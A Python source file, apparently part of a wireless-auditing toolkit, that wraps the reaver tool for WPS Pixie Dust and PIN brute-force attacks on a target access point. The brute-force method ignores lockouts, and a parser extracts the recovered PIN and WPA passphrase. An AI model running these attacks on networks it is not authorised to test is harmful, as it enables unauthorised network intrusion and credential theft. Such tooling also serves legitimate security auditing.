import re
from collections.abc import AsyncIterator

from app.tools.base import AsyncToolWrapper


class ReaverTool(AsyncToolWrapper):
    """Wrapper for reaver — WPS PIN attacks (Pixie Dust & brute force)."""

    binary = "reaver"

    async def pixie_dust(
        self,
        interface: str,
        bssid: str,
        channel: int,
    ) -> AsyncIterator[str]:
        """Perform a Pixie Dust attack (-K flag).

        Yields output lines; look for ``[+] WPA PSK:`` or ``[+] Pin found:``
        to detect success.

        Args:
            interface: Monitor-mode interface.
            bssid: Target AP MAC.
            channel: AP channel.
        """
        args = [
            "-i", interface,
            "-b", bssid,
            "-c", str(channel),
            "-K",    # Pixie Dust
            "-vv",   # verbose
        ]
        async for line in self.stream(args, merge_stderr=True):
            yield line

    async def bruteforce(
        self,
        interface: str,
        bssid: str,
        channel: int,
        delay: int = 2,
    ) -> AsyncIterator[str]:
        """Perform a WPS PIN brute-force attack.

        Args:
            interface: Monitor-mode interface.
            bssid: Target AP MAC.
            channel: AP channel.
            delay: Seconds between PIN attempts (-d flag).
        """
        args = [
            "-i", interface,
            "-b", bssid,
            "-c", str(channel),
            "-vv",
            "-d", str(delay),
            "-L",    # ignore locked state
            "-N",    # no-nacks
        ]
        async for line in self.stream(args, merge_stderr=True):
            yield line

    def parse_result(self, output: str) -> dict | None:
        """Extract PIN and PSK from reaver output.

        Returns:
            Dict with ``pin`` and ``psk`` keys, or None if not found.
        """
        pin_match = re.search(r"\[\+\]\s+(?:Pin found|WPS PIN):\s*(\d+)", output, re.IGNORECASE)
        psk_match = re.search(r"\[\+\]\s+WPA PSK:\s*(.+)", output, re.IGNORECASE)

        if psk_match:
            return {
                "pin": pin_match.group(1) if pin_match else None,
                "psk": psk_match.group(1).strip(),
            }
        return None
